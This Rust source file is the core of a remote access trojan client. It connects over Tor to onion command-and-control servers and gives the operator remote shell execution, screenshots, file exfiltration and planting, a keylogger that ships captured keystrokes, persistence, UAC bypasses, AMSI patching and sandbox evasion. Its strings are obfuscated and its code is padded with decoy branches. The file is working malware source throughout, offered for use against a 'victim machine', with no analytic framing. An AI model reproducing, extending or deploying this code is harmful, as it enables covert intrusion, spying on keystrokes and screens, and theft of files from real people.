mod sandbox;

#[cfg(target_os = "windows")]
mod amsi;
mod keylogger;
mod persist;
mod portscanner;
#[cfg(target_os = "windows")]
mod uac_bypass;
#[cfg(target_os = "windows")]
mod uac_cmstp;
pub mod util;
//#[cfg(feature = "shared-lib")]
mod exports;
#[cfg(target_os = "windows")]
use is_elevated::is_elevated;

use anyhow::{Result, anyhow};
use arti_client::config::TorClientConfigBuilder;
use arti_client::{DataStream, TorClient};
use base64::{Engine as _, engine::general_purpose};
use encstr::{astr, xstr, cobl, opaque_false};
use gethostname::gethostname;
use libc::c_int;
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::time::Instant;
use std::{env, fs};
use tokio::io::split;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::process::Command;
use tokio::time::{Duration, sleep};
use tor_rtcompat::PreferredRuntime;

#[cfg(not(target_os = "android"))]
use screenshots::Screen;
#[cfg(not(target_os = "android"))]
use screenshots::image::ImageOutputFormat;

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

#[cfg(target_os = "windows")]
fn prefer_powershell() -> bool {
    use std::sync::OnceLock;
    static CACHE: OnceLock<bool> = OnceLock::new();
    *CACHE.get_or_init(|| {
        std::process::Command::new("powershell.exe")
            .args(["-NoProfile", "-Command", "gci"])
            .output()
            .ok()
            .map(|o| {
                let out = String::from_utf8_lossy(&o.stdout);
                let err = String::from_utf8_lossy(&o.stderr);
                !out.trim().is_empty()
                    && !err.to_lowercase().contains("wine")
                    && !out.to_lowercase().contains("mono")
            })
            .unwrap_or(false)
    })
}

const CONFIG_HOSTNAME: &[u8] = include_bytes!("../config/hostname");

fn parse_onion_line(line: &str) -> Option<ClientConfig> {
    let line = line.trim();
    if line.is_empty() || line.starts_with('#') {
        return None;
    }
    let (hostname, port_str) = line.rsplit_once(':')?;
    let port: u16 = port_str.parse().ok()?;
    if hostname.is_empty() {
        return None;
    }
    Some(ClientConfig {
        onion: hostname.to_string(),
        port,
    })
}

fn get_onion_configs() -> Vec<ClientConfig> {
    let content = String::from_utf8_lossy(CONFIG_HOSTNAME);
    content.lines().filter_map(parse_onion_line).collect()
}

#[derive(Clone, Debug)]
pub struct ClientConfig {
    pub onion: String,
    pub port: u16,
}
/// Initialize Tor client
async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
    let config = TorClientConfigBuilder::new().build()?;
    let client = TorClient::with_runtime(PreferredRuntime::current()?)
        .config(config)
        .create_bootstrapped()
        .await?;
    println!("{}", &astr!("Initialized Tor Client"));
    Ok(client)
}

#[cfg(not(target_os = "android"))]
fn take_screenshot_base64() -> anyhow::Result<String> {
    let screens = Screen::all()?;
    let screen = &screens[0];

    let image = screen.capture()?;

    let mut png_bytes: Vec<u8> = Vec::new();

    image.write_to(
        &mut std::io::Cursor::new(&mut png_bytes),
        ImageOutputFormat::Png,
    )?;

    let b64 = general_purpose::STANDARD.encode(&png_bytes);
    Ok(format!("{}", b64))
}

fn get_hostname() -> String {
    gethostname()
        .into_string()
        .unwrap_or_else(|_| astr!("unknown"))
}

fn get_username() -> String {
    env::var(astr!("USER"))
        .or_else(|_| env::var(astr!("USERNAME")))
        .unwrap_or_else(|_| astr!("unknown"))
}

/// Execute a command
pub async fn run_command(input: &str) -> Result<Vec<u8>> {
    cobl!({
    if opaque_false() {
        let _decoy = format!("{}{}", astr!("decoy"), astr!("command"));
        return Ok(_decoy.into_bytes());
    }

    let mut parts = input.trim().split_whitespace();

    let cmd = parts
        .next()
        .ok_or_else(|| anyhow!(astr!("Empty command")))?;
    let args: Vec<&str> = parts.collect();

    match cmd {
        _ if cmd == astr!("help") || cmd == astr!("/h") || cmd == astr!("/?") || cmd.is_empty() => {
            Ok(xstr!(
                "

Available commands:
    `cd [directory]`=>\t Change Directory to [directory]
    `screenshot`=>\tTake screenshot from vicim machine
    `upload [filename]`=>\tUpload file to the server
    `download [filename]`=>\tDownload file from the server
    `uac [exe_path]`=>\tRun elevated command on Windows (slui)
    `uac2 [exe_path]`=>\tRun elevated command on Windows (cmstp)
    `persist`=>\tApply persistence on target
    `check_elevated`=>\tCheck if running with elevated privileges
    `self_uac`=>\tRun UAC bypass on self
    `portscan <tcp|udp|sctp> <host> [--fast]`=>\tPort scan target host
    `keylogger_start`=>\tStart capturing keystrokes
    `keylogger_stop`=>\tStop the keylogger

    "
            )
            .into_bytes())
        }
        _ if cmd == astr!("screenshot") => {
            #[cfg(target_os = "android")]
            let encoded = {
                let output = std::process::Command::new(astr!("/system/bin/screencap"))
                    .arg(astr!("-p"))
                    .output()?;
                general_purpose::STANDARD.encode(&output.stdout)
            };
            #[cfg(not(target_os = "android"))]
            let encoded = take_screenshot_base64()?;

            let default_filename = astr!("screenshot.png");
            let filename = args
                .get(0)
                .filter(|s| !s.is_empty())
                .copied()
                .unwrap_or(default_filename.as_str());
            Ok(format!("{}{} {}", astr!("[file] "), filename, encoded).into_bytes())
        }
        _ if cmd == astr!("upload") => {
            let input_filename = args
                .get(0)
                .ok_or_else(|| anyhow!(astr!("upload: missing filename")))?;

            let path = Path::new(input_filename);

            let data = fs::read(path)?;

            let filename = path
                .file_name()
                .and_then(|f| f.to_str())
                .ok_or_else(|| anyhow!(astr!("invalid filename")))?;
            let encoded = general_purpose::STANDARD.encode(&data);

            let mut output = format!("{}{}\n", astr!("[file-start] "), filename);
            for chunk in encoded.as_bytes().chunks(16384) {
                let chunk_str = std::str::from_utf8(chunk).unwrap();
                output.push_str(&astr!("[file-chunk] "));
                output.push_str(chunk_str);
                output.push('\n');
            }
            output.push_str(&format!("{}{}\n", astr!("[file-end] "), filename));
            Ok(output.into_bytes())
        }
        _ if cmd == astr!("download") || cmd == astr!("[file][") => {
            let input_filename = args
                .get(0)
                .ok_or_else(|| anyhow!(astr!("download: missing filename")))?;

            let encoded = args
                .get(1)
                .ok_or_else(|| anyhow!(astr!("download: missing data")))?;

            let data = general_purpose::STANDARD.decode(encoded)?;

            let path = Path::new(input_filename);

            fs::write(path, &data)?;

            Ok(format!("{}{}", astr!("Wrote data to "), input_filename).into_bytes())
        }
        _ if cmd == astr!("cd") => {
            let target = args
                .get(0)
                .ok_or_else(|| anyhow!(astr!("cd: missing argument")))?;

            match std::env::set_current_dir(target) {
                Ok(_) => {
                    let cwd = std::env::current_dir()?;
                    Ok(
                        format!("{}{}\n", astr!("Changed directory to "), cwd.display())
                            .into_bytes(),
                    )
                }
                Err(e) => Ok(format!("{}{}\n", astr!("cd error: "), e).into_bytes()),
            }
        }
        _ if cmd == astr!("uac") => {
            #[cfg(target_os = "windows")]
            {
                if args.is_empty() {
                    return Ok(astr!("uac: missing argument\n").into_bytes());
                }

                let payload = args.join(" ");
                uac_bypass::uac_slui(&payload);

                Ok(format!(
                    "{}{}\n",
                    astr!("Triggered UAC (slui) with payload: "),
                    payload
                )
                .into_bytes())
            }

            #[cfg(not(target_os = "windows"))]
            {
                Ok(astr!("uac not supported on this OS\n").into_bytes())
            }
        }

        _ if cmd == astr!("uac2") => {
            #[cfg(target_os = "windows")]
            {
                if args.is_empty() {
                    return Ok(astr!("uac2: missing argument\n").into_bytes());
                }

                let payload = args.join(" ");
                let ret = uac_cmstp::execute(&payload);
                if ret == 0 {
                    Ok(format!(
                        "{}{}\n",
                        astr!("UAC (cmstp) triggered with payload: "),
                        payload
                    )
                    .into_bytes())
                } else {
                    Ok(format!(
                        "{}{}{}{}\n",
                        astr!("UAC (cmstp) failed (returned "),
                        ret,
                        astr!(") with payload: "),
                        payload
                    )
                    .into_bytes())
                }
            }

            #[cfg(not(target_os = "windows"))]
            {
                Ok(astr!("uac2 not supported on this OS\n").into_bytes())
            }
        }

        _ if cmd == astr!("check_elevated") => {
            #[cfg(target_os = "windows")]
            {
                let elevated = is_elevated();
                Ok(format!("{}{}\n", astr!("Elevated: "), elevated).into_bytes())
            }
            #[cfg(not(target_os = "windows"))]
            {
                Ok(astr!("check_elevated not supported on this OS\n").into_bytes())
            }
        }

        _ if cmd == astr!("self_uac") => {
            #[cfg(target_os = "windows")]
            {
                let exe_path = match std::env::current_exe() {
                    Ok(p) => p.to_string_lossy().to_string(),
                    Err(_) => return Ok(astr!("Failed to get exe path\n").into_bytes()),
                };
                uac_bypass::uac_slui(&exe_path);
                Ok(
                    format!("{}{}\n", astr!("Self-UAC triggered (slui) for: "), exe_path)
                        .into_bytes(),
                )
            }
            #[cfg(not(target_os = "windows"))]
            {
                Ok(astr!("self_uac not supported on this OS\n").into_bytes())
            }
        }

        _ if cmd == astr!("persist") => {
            let _ = persist::persist();
            Ok(astr!("Persistence applied\n").into_bytes())
        }

        _ if cmd == astr!("portscan") => {
            let protocol = args
                .get(0)
                .ok_or_else(|| anyhow!(astr!("portscan: missing protocol")))?
                .to_lowercase();
            let host = args
                .get(1)
                .ok_or_else(|| anyhow!(astr!("portscan: missing host")))?
                .to_string();
            let fast = args.iter().any(|a| *a == astr!("--fast"));

            let ports: Vec<u16> = if fast {
                portscanner::COMMON_PORTS.to_vec()
            } else {
                (1..=65535).collect()
            };

            let total = ports.len();
            let msg = format!(
                "{}{}{}{}{}{}{}",
                astr!("Scanning "),
                total,
                astr!(" ports on "),
                host,
                astr!(" ("),
                protocol,
                astr!(")...\n")
            );
            let scan_type = protocol.as_str();

            let open = match scan_type {
                _ if scan_type == astr!("tcp") => portscanner::scan_tcp(&host, &ports).await,
                _ if scan_type == astr!("udp") => portscanner::scan_udp(&host, &ports).await,
                _ if scan_type == astr!("sctp") => {
                    #[cfg(unix)]
                    {
                        portscanner::scan_sctp(&host, &ports).await
                    }
                    #[cfg(not(unix))]
                    {
                        return Err(anyhow!(astr!("SCTP scan not supported on this OS")));
                    }
                }
                _ => {
                    return Err(anyhow!(
                        "{}{}{}",
                        astr!("portscan: unknown protocol '"),
                        protocol,
                        astr!("' (use tcp, udp, or sctp)")
                    ));
                }
            };

            if open.is_empty() {
                Ok(format!("{}{}{}\n", msg, astr!("No open ports found on "), host).into_bytes())
            } else {
                Ok(format!(
                    "{}{}{}{}{}{}{}{}",
                    msg,
                    astr!("Open ports on "),
                    host,
                    astr!(" ("),
                    protocol,
                    astr!("): "),
                    open.iter()
                        .map(|p| p.to_string())
                        .collect::<Vec<_>>()
                        .join(", "),
                    astr!("\n")
                )
                .into_bytes())
            }
        }

        _ if cmd == astr!("exit") || cmd == astr!("quit") || cmd == astr!("/quit") => {
            Ok(astr!("Goodbye\n").into_bytes())
        }

        _ => {
            #[cfg(target_os = "windows")]
            let mut command = if prefer_powershell() {
                let mut c = Command::new(astr!("powershell.exe"));
                c.arg(astr!("-NoProfile"))
                    .arg(astr!("-Command"))
                    .arg(input);
                c.creation_flags(CREATE_NO_WINDOW);
                c
            } else {
                let mut c = Command::new(astr!("cmd.exe"));
                c.arg(astr!("/C")).arg(input);
                c.creation_flags(CREATE_NO_WINDOW);
                c
            };

            #[cfg(target_os = "linux")]
            let mut command = {
                let mut c = Command::new(astr!("/bin/sh"));
                c.arg(astr!("-c")).arg(input);
                c
            };
            #[cfg(target_os = "macos")]
            let mut command = {
                let mut c = Command::new(astr!("/bin/sh"));
                c.arg(astr!("-c")).arg(input);
                c
            };
            #[cfg(target_os = "android")]
            let mut command = {
                let mut c = Command::new(astr!("/system/bin/sh"));
                c.arg(astr!("-c")).arg(input);
                c
            };

            let output = command.output().await?;
            let mut result = Vec::new();
            result.extend_from_slice(&output.stdout);
            result.extend_from_slice(&output.stderr);

            if result.is_empty() {
                result.extend_from_slice(&astr!("(no output)\n").into_bytes());
            }

            if !result.ends_with(b"\n") {
                result.push(b'\n');
            }

            Ok(result)
        }
    }
    })
}

/// Connect to onion service
pub async fn connect_onion(
    tor_client: &TorClient<PreferredRuntime>,
    onion_addr: &str,
    port: u16,
) -> Result<DataStream> {
    Ok(tor_client.connect((onion_addr, port)).await?)
}

/// Session loop, returns Ok(true) on exit, Ok(false) on disconnect
pub async fn read_loop(
    stream: DataStream,
    keylogger: Arc<Mutex<keylogger::Keylogger>>,
) -> Result<bool> {
    cobl!({
    if opaque_false() {
        let _junk = astr!("decoy_path");
        return Ok(false);
    }

    let (mut reader, mut writer) = split(stream);

    let mut buf = [0u8; 16384];
    let mut buffer = String::new();
    let mut dl_filename: Option<String> = None;
    let mut dl_data: String = String::new();

    let hostname = get_hostname();
    let username = get_username();
    let mut last_keylog_flush = Instant::now();

    fn make_prompt(username: &str, hostname: &str) -> String {
        let cwd = std::env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|_| astr!("?"));
        format!(
            "{}{}{}{}{}{}",
            username,
            astr!("@"),
            hostname,
            astr!(" ["),
            cwd,
            astr!("] >> ")
        )
    }

    let initial_prompt = make_prompt(&username, &hostname);
    writer.write_all(initial_prompt.as_bytes()).await?;
    writer.flush().await?;

    loop {
        tokio::select! {
            result = reader.read(&mut buf) => {
                let n = result?;
                if n == 0 {
                    println!("{}", &astr!("Connection closed by remote"));
                    return Ok(false);
                }

                buffer.push_str(&String::from_utf8_lossy(&buf[..n]));

                while let Some(pos) = buffer.find('\n') {
                    let mut line = buffer[..pos].to_string();
                    buffer.drain(..=pos);

                    line = line.trim().to_string();

                    if line.starts_with(&astr!("download-start ")) {
                        let parts: Vec<&str> = line.splitn(2, ' ').collect();
                        dl_filename = Some(parts.get(1).copied().unwrap_or(astr!("unknown").as_str()).to_string());
                        dl_data.clear();
                        continue;
                    }

                    if dl_filename.is_some() {
                        if line.starts_with(&astr!("download-chunk ")) {
                            let parts: Vec<&str> = line.splitn(2, ' ').collect();
                            if let Some(chunk) = parts.get(1) {
                                dl_data.push_str(chunk);
                            }
                            continue;
                        }
                        if line == astr!("download-end") {
                            let fname = dl_filename.take().unwrap();
                            let raw = general_purpose::STANDARD.decode(&dl_data)?;
                            fs::write(&fname, &raw)?;
                            let msg = format!("{}{}\n", astr!("Wrote data to "), fname);
                            writer.write_all(msg.as_bytes()).await?;
                            writer.flush().await?;
                            continue;
                        }
                        dl_filename = None;
                        dl_data.clear();
                    }

                    if line.is_empty() {
                        continue;
                    }

                    if line == astr!("exit") || line == astr!("quit") || line == astr!("/quit") {
                        writer.write_all(&astr!("Goodbye\n").into_bytes()).await?;
                        writer.flush().await?;
                        return Ok(true);
                    }

                    if line == astr!("keylogger_start") {
                        keylogger.lock().unwrap().start();
                        writer.write_all(&astr!("Keylogger started\n").into_bytes()).await?;
                        continue;
                    }

                    if line == astr!("keylogger_stop") {
                        keylogger.lock().unwrap().stop();
                        writer.write_all(&astr!("Keylogger stopped\n").into_bytes()).await?;
                        continue;
                    }

                    match run_command(&line).await {
                      Ok(output) => {
                      writer.write_all(&output).await?;
                      }
                      Err(e) => {
                        let err_msg = format!("{}{}\n", astr!("ERROR: "), e);
                        writer.write_all(err_msg.as_bytes()).await?;
                    }
                }
                }

                let needs_flush = {
                    let kl = keylogger.lock().unwrap();
                    kl.is_running() && last_keylog_flush.elapsed() >= Duration::from_secs(60)
                };
                if needs_flush {
                    let log_data = {
                        let mut kl = keylogger.lock().unwrap();
                        kl.drain_log()
                    };
                    if !log_data.is_empty() {
                        let b64 = general_purpose::STANDARD.encode(log_data.as_bytes());
                        let msg = format!("{}keylog.txt\n{}{}\n{}keylog.txt\n",
                            astr!("[file-start] "),
                            astr!("[file-chunk] "), b64,
                            astr!("[file-end] "));
                        writer.write_all(msg.as_bytes()).await?;
                    }
                    last_keylog_flush = Instant::now();
                }

                let prompt = make_prompt(&username, &hostname);
                writer.write_all(prompt.as_bytes()).await?;
                writer.flush().await?;
            }
            _ = tokio::time::sleep(Duration::from_secs(2)) => {
                let needs_flush = {
                    let kl = keylogger.lock().unwrap();
                    kl.is_running() && last_keylog_flush.elapsed() >= Duration::from_secs(60)
                };
                if needs_flush {
                    let log_data = {
                        let mut kl = keylogger.lock().unwrap();
                        kl.drain_log()
                    };
                    if !log_data.is_empty() {
                        let b64 = general_purpose::STANDARD.encode(log_data.as_bytes());
                        let msg = format!("{}keylog.txt\n{}{}\n{}keylog.txt\n",
                            astr!("[file-start] "),
                            astr!("[file-chunk] "), b64,
                            astr!("[file-end] "));
                        writer.write_all(msg.as_bytes()).await?;
                    }
                    last_keylog_flush = Instant::now();
                }
                continue;
            }
        }
    }
    })
}
fn rand_range(min: u64, max: u64) -> u64 {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    rng.gen_range(min..=max)
}
/// Core runner
pub async fn netclient_run(
    config: ClientConfig,
    keylogger: Arc<Mutex<keylogger::Keylogger>>,
) -> Result<()> {
    cobl!({
    if opaque_false() {
        let _dummy = rand_range(1, 5);
        sleep(Duration::from_secs(_dummy)).await;
    }

    loop {
        println!("{}", &astr!("Attempting to connect..."));

        let tor_client = init_tor().await?;

        match connect_onion(&tor_client, &config.onion, config.port).await {
            Ok(stream) => {
                println!("{}", &astr!("Connected to onion service"));

                match read_loop(stream, keylogger.clone()).await {
                    Ok(true) => {
                        println!("{}", &astr!("Exit requested, reconnecting..."));
                    }
                    Ok(false) => {
                        println!("{}", &astr!("Connection closed"));
                    }
                    Err(e) => {
                        println!("{}{}", astr!("Session error: "), e);
                    }
                }
            }
            Err(e) => {
                println!("{}{}", astr!("Connection failed: "), e);
            }
        }
        let delay = rand_range(5, 30);
        println!(
            "{}{}{}",
            astr!("Reconnecting in "),
            delay,
            astr!(" seconds...")
        );
        sleep(Duration::from_secs(delay)).await;
    }
    Ok(())
    })
}

async fn netclient_impl() -> c_int {
    cobl!({
    if opaque_false() {
        println!("{}", astr!("Decoy init"));
        std::thread::sleep(std::time::Duration::from_secs(1));
        return 0;
    }

    let startup_delay = rand_range(1, 13);
    println!(
        "{}{}{}",
        astr!("Delaying startup by "),
        startup_delay,
        astr!("s")
    );
    sleep(Duration::from_secs(startup_delay)).await;

    let configs = get_onion_configs();
    if configs.is_empty() {
        println!("{}", &astr!("No valid hostname:port entries in config"));
        return 1;
    }

    let _n_configs = configs.len();
    if opaque_false() {
        let _r = _n_configs.wrapping_mul(0xdeadbeef);
        println!("{} {}", astr!("decoy"), _r);
    }

    println!(
        "{}{}{}",
        astr!("Starting "),
        _n_configs,
        astr!(" netclient instance(s)")
    );
    let keylogger = Arc::new(Mutex::new(keylogger::Keylogger::new()));
    let mut handles = Vec::new();
    for cfg in configs {
        let kl = keylogger.clone();
        handles.push(tokio::spawn(async move { netclient_run(cfg, kl).await }));
    }

    for h in handles {
        let _ = h.await;
    }
    0
    })
}
pub async fn netclient() -> c_int {
    sandbox::exit_if_sandboxed();

    cobl!({
    if opaque_false() {
        let _ = astr!("decoy");
        return 1;
    }

    #[cfg(target_os = "windows")]
    {
        let _ = amsi::patch_amsi();
    }
    netclient_impl().await;
    0
    })
}

pub async fn netclient_dll() -> c_int {
    sandbox::exit_if_sandboxed();

    cobl!({
    if opaque_false() {
        std::thread::sleep(std::time::Duration::from_secs(1));
    }
    netclient_impl().await;
    0
    })
}
